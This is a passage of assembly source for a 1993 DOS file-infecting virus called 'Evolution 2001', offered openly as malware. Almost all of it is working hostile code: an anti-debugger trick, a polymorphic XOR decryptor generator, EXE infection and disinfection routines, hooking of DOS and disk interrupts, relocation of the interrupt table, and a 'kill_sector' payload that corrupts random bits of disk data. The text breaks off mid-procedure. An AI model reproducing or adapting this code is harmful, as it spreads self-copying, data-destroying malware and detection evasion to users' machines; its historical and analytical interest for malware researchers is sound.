; Evolution 2001 Virus
; by Lord Salivantis
; Start project time : 11-20-93 06:12pm
; End project time   : 12-07-93 09:15pm
; End full version with destroy phase : 12-09-93 01:11am
; End full tested project time        : 12-09-93 09:04pm

.386c		     ; sorry, but 386/486 only-real mode
LOCALS	 	     ; enable local labels
NOSMART		     ; must be! don't change LEA to MOV ...,OFFSET... !

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                             PUBLICS & EXTERNS
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                 INCLUDES
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                 CONSTANTS
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
VIRSIZE 	EQU OFFSET end_main-OFFSET main; size of virus's code
TMPSIZE		EQU OFFSET end_tmp-OFFSET end_main ; size of temorary data
MASKTMP		EQU 0				; tmp mask - for tests

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                  MACROS
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                  TYPES
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                   WORM
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

ASSUME cs:worm
worm SEGMENT PARA PUBLIC USE16
	mov ax,4c00h
	int 21h
worm ENDS

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                             ARTIFICAL DECODE
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

ASSUME cs:decode
decode SEGMENT PARA PUBLIC USE16
artifical:				; there's begining of code
	cld
	push cs
	pop ds
	push cs
	pop es
	mov si,OFFSET virus
	mov di,OFFSET virus
	mov cx,VIRSIZE/4+1+2		; the VIRSIZE divide by 4 & add 3
@@looping:
	lodsd
	xor eax,MASKTMP
	stosd
	loop @@looping			; decoding
virus:
	mov ax,cs
	add ax,4
	push ax
	push 0
	retf                        	; far jump to evo2001
whole   DB 28 DUP(90h)			; fill the whole (2 paragrafs)
decode ENDS

ASSUME cs:code16,ds:code16,ss:code16
code16 SEGMENT PARA PUBLIC USE16

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;                                   CODE
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

main:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	cld							; intro
	push cs
	pop ds			; set DS equal CS
	push 0
	pop fs			; set FS equal 0 (IDT segment)
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov eax,fs:[01h*4]					; action
	push eax
	push ss
	pop ss
	mov dword ptr fs:[01h*4],0			; no debuggers!
	call test_it
	jc @@yeah
	call install
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
@@yeah:                                                         ; conclusion
	pop eax
	mov dword ptr fs:[01h*4],eax
	mov ax,cs
	sub ax,[dcs]
	push ax
	push [ip]
	mov ah,51h
	int 21h
	mov ds,bx
	mov es,bx		; DS & ES set to PSP of victim
	retf			; go back to original code
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                                 PROCEDURES
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; kill_sector
; In  :
;   ES:BX -> pointer to buffer
; Comment: change one bit in buffer of read/write data
;          it's only call one per 256 reads/writes calls
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
kill_sector PROC
	dec [sector]    ; next sector readed or wrote
	jnz maybe_late
	push ax
	push cx
	push dx		; push used registers
	mov ax,512d*8
	call random   	; random bit on the space 512 bytes
	bt es:[bx],ax  ; complement random bit (in test version BT - not BTC!)
	pop dx
	pop cx
	pop ax          ; pop regs
maybe_late:
	ret
kill_sector ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; wait
; In  :
;   nothing
; Comment: Wait some time for show logo.
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
wait_a_moment PROC
	cli		; disable interrupts
	mov eax,0f00000h ; 15728640d repeats
waiting:
	dec eax
	jnz waiting      ; next
	sti              ; enable interrupts again
	ret
wait_a_moment ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; reset_logo
; In  :
;   nothing
; Comment: Print logo before reset machine
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
reset_logo PROC
	push 0b800h
	pop es
	mov cx,1000d       ; 1000d * dword = 4000 bytes for VRAM
	mov eax,07200720h  ; spaces with 7 attribute
	xor di,di
	rep stosd	; fill VRAM - clear screen
	mov di,12*160+5d ; set byte for write to VRAM
	mov si,OFFSET text1 ; input data to text1
	mov ah,7	; set default attribute
printing:
	lodsb          ; get char to AL
	or al,al        ; if null then end
	jz end_printing
	stosw          ; put char to VRAM
	jmp printing   ; next!
end_printing:
	ret
reset_logo ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; set_date
; In  :
;   BX -> file handle to infect
;   SI -> years to add to date
; Comment: set old date - add some years (100 or -100 etc.)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
set_date PROC
	mov cx,word ptr [date]
	mov dx,word ptr [date+2]
	mov ax,dx
	shr ax,9
	add ax,si
	shl ax,9
	and dx,111111111b
	or dx,ax	; add 100 years to date
	mov ax,5701h
	call org21h	; refresh last modify date of victim
	ret
set_date ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; uninfecting
; In  :
;   BX -> file handle to infect
; Comment: uninfect file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
uninfecting PROC
	push bx			; it helps some one
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov ah,3fh						; load virus
	mov cx,20h
	mov dx,OFFSET headerEXE
	call org21h	; read header of EXE file
	cmp word ptr [headerEXE],'ZM'	; are you EXE???
	jne not_an_EXE	; it's not an EXE file
	mov ax,word ptr [headerEXE+0016h]
	add ax,word ptr [headerEXE+0008h]
	mov dx,ax
	shl dx,4
	mov cx,ax
	shr cx,12   	; in CX:DX pointer to begin of virus in victim file
	mov ax,4200h
	call org21h     ; lseek there
	mov dx,OFFSET end_tmp
	shr dx,4
	inc dx
	mov si,dx
	shl dx,4	; fill to 16 offset of buffer for virus
	push dx
	mov cx,VIRSIZE+64+16
	mov ah,3fh
	call org21h     ; read virus to DS:DX buffer
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov eax,fs:[01h*4]
	push eax          	; member 01h vector
	mov word ptr fs:[01h*4],OFFSET int01h_bis
	mov word ptr fs:[01h*4+2],cs      ; set new vector
	mov ax,cs
	add ax,si		; in AX segment of destination code
	add ax,4
	mov [boundary],ax	; set boundary to segment after decode proc
	sub ax,4
	pushf
	pop bx
	or bh,1
	push bx                 ; set TF flag to 1
	push ax
	push 0                  ; push adress to go to decode proc
	iret                    ; go with step work
come_back:
	push cs
	pop ds
	push cs
	pop es			; refresh DS & ES
	pop eax
	mov fs:[01*4],eax	; refresh int01h vector
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	pop di		; in DI end_tmp with 16 fill
	add di,64	; in DI offset to adressing in loaded virus (like here)
	mov ax,[di+old_ss]
	mov word ptr [headerEXE+000eh],ax	; put old SS to header
	mov ax,word ptr [headerEXE+0016h]
	mov bx,[di+dcs]
	sub ax,bx
	add ax,4		; add for miss decode proc
	mov word ptr [headerEXE+0016h],ax ; calculate old CS
	mov ax,[di+ip]
	mov word ptr [headerEXE+0014h],ax ; put old IP to header
	mov eax,[size_file]
	sub eax,VIRSIZE+64+16	; substarct const virus's size
	mov esi,eax		; preserve for later
	mov cx,ax
	and cx,511d
	mov word ptr [headerEXE+0002h],cx
	shr eax,9
	inc ax	; add not filled page -  it's count too!
	mov word ptr [headerEXE+0004h],ax ; put old file size to header
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	pop bx							; write it!
	call rewind
	mov ah,40h
	mov cx,20h
	mov dx,OFFSET headerEXE
	call org21h		; write refreshed header
	mov dx,si
	shr esi,16
	mov cx,si
	mov ax,4200h
	call org21h		; lseek to old size of victim (except virus)
	xor dx,dx
	xor cx,cx
	mov ah,40h
	call org21h		; truncate!
	mov si,-100d
	call set_date		; refresh old date
not_an_EXE:
	ret
uninfecting ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; fill_place
; In  :
;   nothing
; Comment: fill buffer for decode procedure
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
fill_place PROC
	mov cx,16
	mov eax,90909090h
	mov di,OFFSET end_tmp
	rep stosd	; fill! 32 bits!!! only NOPs!
	ret
fill_place ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; add_teleport
; In  :
;   nothing
; Comment: Add teleport to virus code (from decode procedure)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
add_teleport PROC
	mov di,[pointer]
	add di,OFFSET end_tmp
	mov si,OFFSET teleport
	mov cx,9
	rep movsb	; add!
	ret
add_teleport ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; append_vir
; In  :
;   nothing
; Comment: append body of virus after decode procedure
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
append_vir PROC
	mov di,OFFSET end_tmp+64
	xor si,si
	mov cx,(VIRSIZE)/4+1
	rep movsd	; append code virus!
	ret
append_vir ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; xor_it
; In  :
;   nothing
; Comment: xor the body of virus & part of decode procedure mask 'decode_mask'
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
xor_it PROC
	mov si,[pointer]
	mov cx,(VIRSIZE+64)/4+1
do_xor:
	mov eax,dword ptr [si+end_tmp]
	xor eax,dword ptr [decode_mask]
	mov dword ptr [si+end_tmp],eax
	add si,4
	loop do_xor
	ret
xor_it ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; generate
; In  :
;   nothing
; Comment: generate a polymorphous decode procedure
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
generate PROC
	push eax
	push bx		; preserve size & file descriptor

	push ds
	pop es		; set ES equal DS
	call randomize	; init generator
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov cx,(OFFSET end_main-OFFSET com_sel_reg)/2		; preface
	mov si,OFFSET com_sel_reg
selecting:
	push cx
	mov bx,[si]
	call select_reg
	inc si
	inc si
	pop cx
	loop selecting			; select registers in many commands (CX)
	mov bx,OFFSET command7_3+4
	call select_adds
	mov bx,OFFSET command9_3+4	; plus four must be!
	call select_adds           	; introduction
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	call fill_six_array                                           ; core
	mov [pointer],0
	call fill_place
	call make_first_six
	call make_last_four
	call correct
	call add_teleport
	call append_vir
	pop bx
	pop eax
	ret
generate ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; randomize
; In  :
;   nothing
; Comment: init generator of random numbers
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
randomize PROC
	mov ax,fs:[046ch]	; get timer
	mov [seed],ax
	ret
randomize ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; select_reg
; In  :
;   BX -> pointer to command
; Comment: select random register to load other (segment or CX)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
select_reg PROC
	mov ax,3
	call random          	; random register
	cmp ax,1
	jne no_one              ; CX can not be (!)
	inc ax
	inc ax                  ; so if occur then add two for BX
no_one:
	mov di,bx
	mov cl,byte ptr [bx]
	and cl,0f0h
	cmp cl,0b0h		; is it load to normal register (no segment)
	jnz normal
	dec bx			; if absolute value then registers are described in first byte - no in second
	inc di
normal:
	and byte ptr [bx+1],11111000b
	or byte ptr [bx+1],al   ; set select register in command 1
	and byte ptr [di+3],11111000b
	or byte ptr [di+3],al   ; set select register in command 2
	ret
select_reg ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; select_adds
; In  :
;   BX -> pointer to command
; Comment: select random adds to addition commands - sum of adds must be 4
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
select_adds PROC
	mov ax,5
	call random       	; select value
	mov byte ptr [bx+2],al  ; store in first addition
	neg al
	add al,4
	mov byte ptr [bx+5],al  ; store rem in second addition
	ret
select_adds ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; make_command
; In  :
;   EDX -> number of command to do
; Comment: select random mutation of command drom EDX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
make_command PROC
	lea si,[edx*2+edx]
	movzx ax,byte ptr [si+commands] ; load number of mutant of command
	call random  ; select one
	mov si,word ptr [si+commands+1]
@@chain:
	or ax,ax
	jz @@end_chain
	movzx bx,byte ptr [si]
	add si,bx
	inc si
	dec ax
	jmp @@chain	; find select command in chain
@@end_chain:
	movzx cx,[si]
	inc si
	mov di,[pointer]
	add di,OFFSET end_tmp
	rep movsb
	sub di,OFFSET end_tmp
	mov [pointer],di	; copy select command
	ret
make_command ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; make_first_six
; In  :
;   nothing
; Comment: set first six commands - full permutation (6!)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
make_first_six PROC
	mov cx,6   	; six commands to join
@@next:
	push cx
	mov ax,cx
	call random     ; random from 0 to AX-1
	dec cx
	sub cx,ax       ; substract AX-1 (random value - 1)
	movzx eax,ax
	movzx edx,[eax+six]
	or cx,cx
	jz @@no_move
@@move_six:
	mov bl,[eax+six+1]
	mov [eax+six],bl
	inc ax
	loop @@move_six	; move six array (length of array--)
@@no_move:
	call make_command
	pop cx
	loop @@next
	ret
make_first_six ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; make_last_four
; In  :
;   nothing
; Comment: set last four commands - none permutation :(
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
make_last_four PROC
	mov ax,[pointer]
	mov [jump_point],ax	; member jump point
	mov edx,6
do_rem:
	cmp dx,10d
	jz no_more
	push dx
	call make_command
	pop dx
	inc dx
	jmp do_rem
no_more:
	ret
make_last_four ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; fill_six_array
; In  :
;   nothing
; Comment: fill array of six numbers : 0,1,2,3,4,5
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
fill_six_array PROC
	mov ecx,6
filling:
	dec cx
	mov [ecx+six],cl
	inc cx
	loop filling
	ret
fill_six_array ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; correct
; In  :
;   nothing
; Comment: correct values in generated decode procedure (mask, offsets etc.)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
correct PROC
	xor si,si
	mov dx,[pointer]
correcting:
	mov eax,dword ptr [si+end_tmp]
	cmp eax,0fefefefeh            ; maybe mask
	jne no_mask
	push dx				; preserve DX!
	mov ax,0ffffh
	call random
	shl eax,16
	mov ax,0ffffh
	call random                   ; if yes then random new mask
	mov [decode_mask],eax	      ; store random mask
	pop dx
	jmp no_offset
no_mask:
	cmp ax,0ffffh
	jne no_offset
	mov ax,dx              ; if it's offset start of decode then store it
no_offset:
	mov dword ptr [si+end_tmp],eax
	inc si
	cmp si,dx	      ; continue while SI less than pointer
	jl correcting
	mov bx,dx
	dec bx
	mov ax,[jump_point]
	sub ax,bx
	dec ax
	mov byte ptr [bx+end_tmp],al	; store jump address in loop of decode
	ret
correct ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; copy_to_seg
; In  :
;   BX -> destination segment
; Comment: copy yourself code to segment, change IDTR!!!!
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
copy_to_seg PROC
	mov es,bx
	xor si,si
	xor di,di
	mov cx,VIRSIZE/4+1
	rep movsd	; yeahhh... i like that... 32 bits...

	cmp bx,9fffh		; VCPI is installed if you find UMB
	ja vcpi_installed	; TESTS ONLY!!!!!!!!!!!!!! (JA must be!)
.386p
	smsw ax                 ; store MSW to AX
.386c
	test al,1         	; if pmode has been already inited
	jnz vcpi_installed      ; then jump
	push es
	mov word ptr [descIDT],3ffh  	; set length of new IDT
	add bx,(VIRSIZE+TMPSIZE-1024)/16+1
	mov es,bx
	movzx ebx,bx
	shl ebx,4
	mov dword ptr [descIDT+2],ebx   ; & adress
	xor si,si
	xor di,di
	mov cx,100h
	rep movs dword ptr es:[di],dword ptr fs:[si]
.386p
	cli
	lidt [descIDT]   	    ; change IDTR only if VCPI not installed
	sti
.386c
	push es
	pop fs
	pop es
vcpi_installed:
	mov es:[intr_seg],fs	   ; store in resident segment of IDT
	ret
copy_to_seg ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; get_13h_and_21h
; In  :
;   ES -> segment of resident
; Comment: get 13hth & 21hth vektor - action with trace!!!
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
get_13h_and_21h PROC
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	push es					       ; calculate boundaries
	mov ah,52h
	int 21h
	mov ax,es:[bx-2]		; get first MCB to AX
	pop es
	mov [boundary],ax		; boundaries from 0 to first MCB
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov word ptr fs:[01h*4],OFFSET int01h			   ; do it!
	mov word ptr fs:[01h*4+2],cs	; set step work interrupt
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov ah,3dh		; testing function is open file	  ; int 21h
	mov bx,21h		; interrupt number
	mov [conditional],77h	; write there JA opcode
	mov di,OFFSET int21h
	mov si,OFFSET old21h
	call step_work		; trace it!
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	mov [boundary],0f000h					  ; int 13h
	mov ah,40h
	mov bx,13h
	mov [conditional],75h	; write there JNE opcode
	mov di,OFFSET int13h
	mov si,OFFSET old13h
	call step_work
	ret
get_13h_and_21h ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; get_vektorz
; In  :
;   ES -> segment of resident
; Comment: i don't remember what is this
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
get_vektorz PROC
	mov word ptr es:[swap1bh],OFFSET int1bh
	mov word ptr es:[swap1bh+2],es
	mov word ptr es:[swap24h],OFFSET int24h
	mov word ptr es:[swap24h+2],es ; set swap's fileds for vektorz 1bh & 24h (in resident)
	mov eax,fs:[09h*4]
	mov es:[old09h],eax	; set int09h in resident
	cli
	mov word ptr fs:[09h*4],OFFSET int09h
	mov fs:[09h*4+2],es		; get 9hth vektor
	sti
	ret
get_vektorz ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; get_SFT_chain
; In  :
;   nothing
; Comment: Get pointer of SFT chain.
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
get_SFT_chain PROC
	push es
	mov ah,52h
	int 21h
	mov eax,es:[bx+4]	; in EAX pointer to first SFT list
	pop es
	mov es:[SFT_pointer],eax ; store it!
	ret
get_SFT_chain ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; install
; In  :
;   nothing
; Comment: install Evolution 2001 in memory, get vektorz etc.
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
install PROC
	call select_seg
	call prepare_seg
	call copy_to_seg
	call get_13h_and_21h
	call get_vektorz		; all functions are autodescribed
	call get_SFT_chain
	mov es:[kb_flag],0		; init KB_FLAG variable
	mov es:[sector],0		; init sector number to 0
	ret
install ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; org21h
; In  :
;   the same like int 21h
; Comment: call original interrupt 21h
